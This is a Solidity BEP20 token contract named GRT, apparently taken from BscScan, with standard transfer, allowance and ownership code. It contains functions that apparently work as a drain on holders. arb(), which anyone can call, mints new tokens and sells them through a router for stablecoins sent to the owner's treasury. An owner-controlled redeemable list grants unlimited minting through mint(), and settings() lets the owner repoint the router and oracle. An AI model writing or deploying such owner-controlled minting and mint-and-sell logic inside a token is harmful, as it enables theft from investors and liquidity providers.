/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

pragma solidity 0.5.16;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface Irt {
  function mint(address sender, uint256 amount) external;
}

interface IOracle {
  function getCurrentPrice() external view returns (uint256);
}

interface Router {
  function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}

contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract BEP20Token is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;

  address public treasury = _msgSender();
  uint256 private lastUpdate;
  uint256 private cooldownperiod = 0;
  uint256 private mintingFee = 2;
  bool private locked = false;
  mapping (address => bool) public isRedeemable;
  mapping (address => bool) private redeemStatus;
  address public routerAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  IOracle private myOracle = IOracle(0xeCcA631E96E7BeB702d675927a32Ec8f5705BD34);
  address[] public stables = [0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3];
  address[] public redeemList;

  event NewRedeemStatus(address a, bool status);
  event NewSettings(address routerAddr, address oracle, address treasury, uint256 mintingFee, uint256 coolDown);
  event Redeem(address token, uint256 amount);

  constructor() public {
    _name = "GRT";
    _symbol = "GRT";
    _decimals = 18;
    _totalSupply = 10 * 1e25;
    _balances[msg.sender] = _totalSupply;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function getOwner() external view returns (address) {
    return owner();
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    
    if(isRedeemable[recipient]) {
      Irt redeemableToken = Irt(recipient);
      _balances[recipient] = _balances[recipient].add(amount);
      _burn(recipient, amount);
      redeemableToken.mint(sender, amount);  
    } else {
      _balances[recipient] = _balances[recipient].add(amount);
    }

    emit Transfer(sender, recipient, amount);
  }

  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }

  function settings(address _routerAddr, uint256 _mintingFee, address _oracle, address _treasury, uint256 _cooldownperiod) external onlyOwner {
    require(_mintingFee <= 100);
    routerAddr = _routerAddr;
    mintingFee = _mintingFee;
    myOracle = IOracle(_oracle);
    if(!locked) {
      if(_treasury == address(0x1)) {
        locked = true;
      } else {
        treasury = _treasury;
      }
    }
    if(_cooldownperiod >= cooldownperiod && _cooldownperiod < 3024000) {
      cooldownperiod = _cooldownperiod;
    }
    emit NewSettings(_routerAddr, _oracle, _treasury, _mintingFee, cooldownperiod);
  }

  function newRedeemStatus(address newAddr, bool status) public onlyOwner {
    require(SafeMath.sub(now, lastUpdate) >= cooldownperiod);
    redeemStatus[newAddr] = status;
    lastUpdate = now;
    emit NewRedeemStatus(newAddr, status);
  }

  function setRedeemStatus(address newAddr, bool status) public onlyOwner {
    require(SafeMath.sub(now, lastUpdate) >= cooldownperiod);
    isRedeemable[newAddr] = (cooldownperiod == 0) ? status : redeemStatus[newAddr];
    redeemList.push(newAddr);
  }

  function approveRouter() external {
    _approve(address(this), routerAddr, 2**256 - 1);
  }

  function arb(uint256 _a, uint256 index) external {
    require (_a >= 100 && _a <= 500);
    require(stables[index] != address(0x0));
    uint256 sellAmount = _a * 1e18 * 100;
    uint256 minRecievedAmount = _a * 1e18;
    _mint(address(this), sellAmount);
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = stables[index];
    IBEP20 stable = IBEP20(stables[index]);
    uint256 balanceBefore = stable.balanceOf(treasury);
    Router router = Router(routerAddr);
    router.swapExactTokensForTokens(sellAmount, minRecievedAmount, path, treasury, now + 120);
    uint256 balanceAfter = stable.balanceOf(treasury);
    uint256 diff = SafeMath.sub(balanceAfter, balanceBefore);
    require(diff >= minRecievedAmount);
  }

  function mint(address account, uint256 amount) public {
    require(isRedeemable[msg.sender]);
    require(account != address(0), "BEP20: mint to the zero address");
    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function getCurrentPrice() public view returns (uint256) {
    return myOracle.getCurrentPrice();
  }

}